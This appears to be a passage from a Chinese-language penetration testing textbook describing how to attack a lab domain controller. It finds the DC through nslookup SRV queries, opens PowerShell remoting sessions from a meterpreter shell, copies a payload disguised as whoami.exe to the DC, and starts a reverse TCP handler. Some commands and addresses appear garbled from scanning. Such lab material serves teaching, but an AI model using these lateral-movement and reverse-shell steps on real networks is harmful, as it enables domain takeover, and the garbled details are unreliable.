
## 24.9 目标：域控制器

此时，我们已经攻破了两个 Linux 服务器：Ajla 和 Zora。通过 Zora 的内部网络访问，我们能够渗透到 Poultry。该主机允许我们对内部域进行初步的查看。从这里开始，我们攻破了 Cevapi，并直接在 Cevapi 上伪装了沙箱管理员的令牌。现在，我们需要使用这种伪装身份来获取对域控制器的访问。

![](img/f99f528ca9845f4c256ce54e882b1345_846_0.png)

### 24.9.1 攻击域控制器

由于有了以域管理员身份运行命令的能力，获取域控制器权限的一种方法是使用 PowerShell 的 `New-PSSession` 命令对远程主机开启新会话

要执行此操作，我们将首先发现域控制器的主机名，以确保我们的目标是正确的服务器。为了发现主机名，我们使用 `nslookup`。

```
C:\Windows\system32>nslookup

nslookup

dns request timed out.

timeout was 2 seconds.

Default Server: Unknown

Address: 10.5.5.30
```

- `set type=all`

> _ldap_tcp.dc_mdcs.sandbox.local

```
Server: Unknown

Address: 10.5.53.30
```

```
_ldap_tcp.dc_mdcs.sandbox.local SRV service location:

prior = 0

weight = 100

port = 339

svr hostname = SANDBOXDC.sandbox.local

SANDBOXDC.sandbox.local internet address = 10.5.53.30
```

```
> exit
```

```
C:\Windows\system32>
```

列表 1001 - 使用 `nslookup` 发现主机名

在不带任何选项的情况下运行 `nslookup` 将会进入交互模式，允许我们设置要查找的记录类型。在这种情况下，查找类型是“all”。接下来，我们对 `sandbox` 域内的 `_ldap_tcp.dc_mdcs` 条目进行查询。这导致 `nslookup` 返回域控制器的主机名。

在获取账户后，我们将从 `meterpreter` shell 中获取 `powershell`。

```
meterpreter > shell

Process 260 created.

Channel 5 created.

...
```

```
C:\Windows\system32>powershell

powershell
```

```
PS C:\Windows\system32>
```

列表 1002 - 启动 PowerShell

在提示符处，我们将使用带有 `-Computer SANDBOXDC` 标志的 `New-PSSession` 在域控制器上启动一个新会话，该会话将被存在 `$dcsession` 对象中。

```
C:\Windows\system32>$dcsession = New-PSSession -Computer SANDBOXDC
$dcsession = New-PSSession -Computer SANDBOXDC
PS C:\Windows\system32>
```

列表 1003 - 创建新的 PowerShell 会话

从这里开始，我们使用 `Invoke-Command` 命令在域控制器上运行命令。我们需要使用 `-Session` 标志指定会话，并使用 `-ScriptBlock` 命令指定要执行的命令。我们要获取的命令被封装在大括号中。检查域控制器 IP 的示例见下方。

```
PS C:\Windows\system32> Invoke-Command -Session $dcsession -ScriptBlock {ipconfig}
Invoke-Command -Session $dcsession -ScriptBlock {ipconfig}
```

Windows IP 配置

以太网适配器 Ethernet8:

Connection-specific DNS Suffix : :

Link-local IPv6 地址 : fe80::8539:433a:4360:175f%2
IPv4 地址 : 10.5.5.30
子网掩码 : 255.255.255.0
默认网关 : 10.5.5.1

列表 1004 - 使用 `Invoke-Command` 检查 IP

现在我们就可以对域控制器执行命令了，我们将传输并使用 `meterpreter` shell。首先，我们必须将 shell 传输到域控制器。为此，我们将使用 PowerShell 的 `Copy-Item`。要传输到另一个主机，必须提供传输的文件、传输的目标以及我们创建的 PowerShell 会话。

```
PS C:\Windows\system32> Copy-Item "C:\Users\Public\whoami.exe" -Destination "C:\Users\Public\" -Session $dcsession
```

列表 1005 - 传输到域控制器

文件传输完成后，我们需要执行它。否则，需要配置一个监听器来捕获反向 shell。为了执行此操作，我们将当前的 `meterpreter` shell 放入后台并启动一个新的监听器。在运行命令时，我们将使用 `-j` 标志将新的处理程序作为后台作业启动。

```
meterpreter > background
[*] Backgrounding session 2...
msf5 exploit(multi/handler) > run -j
[*] running as background job 1.
[*] completed, no session was created.
+] Started reverse TCP handler on 10.5.5.4:8
```

# 使用 Kali Linux 2.0 进行渗透测试
